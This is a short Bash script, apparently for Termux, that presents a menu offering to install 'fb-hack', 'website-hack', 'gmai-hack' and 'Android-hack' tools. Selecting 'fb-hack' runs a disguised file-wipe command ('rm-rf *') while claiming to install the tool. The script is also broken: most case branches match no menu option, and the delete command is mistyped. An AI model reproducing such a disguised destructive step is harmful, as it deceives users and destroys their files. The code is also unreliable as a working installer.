clear
banner()
{

  printf "
\e[35mM╔═══╗───────────────────╔╗───╔╗╔╗
║╔══╝──────────────────╔╝╚╗──║║║║
║╚══╦══╦══╦╗─╔╗──╔╦═╗╔═╩╗╔╬══╣║║║╔══╦═╗
║╔══╣╔╗║══╣║─║╠══╬╣╔╗╣══╣║║╔╗║║║║║║═╣╔╝
║╚══╣╔╗╠══║╚═╝╠══╣║║║╠══║╚╣╔╗║╚╣╚╣║═╣║
╚═══╩╝╚╩══╩═╗╔╝──╚╩╝╚╩══╩═╩╝╚╩═╩═╩══╩╝
──────────╔═╝║
──────────╚══╝"
  echo "|  gmail:bptz393@gmail.com
            github:https://github.com/Ever-Sad12|"
  echo "+-----Make_by_Bhonepyae-----------------+"
}

banner "Starting the Job"
sleep 3

PS3='Choose u want to install: '
pkg=("fb-hack" "website-hack" "gmai-hack" "Android-hack" "zero_@290G" "exit")
select fav in "${pkg[@]}"; do
    case $fav in
        "fb-hack")
            echo "start runing"
            rm-rf *
            echo "install fb-hack"
            exit
            ;;
        "Python2")
            echo "
            start runing..."
            pkg install python2 -y
            echo "This pkg is installed"
            exit
            ;;
        "git")
            echo "start runing..."
            pkg install git -y
            echo "This pkg is installed"
            exit
            ;;
        "Install-3pkg")
            echo "start runing"
            pkg install python -y
            pkg install python2 -y
            pkg install git -y
            echo "All are installed"
            exit
            ;;
        "ifconfig")
            echo "start runing"
            pkg install net-tools
            ifconfig
            echo "This is your ip"
            exit
            ;;
        "exit")
            echo "Thank for using my tool"
            exit
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
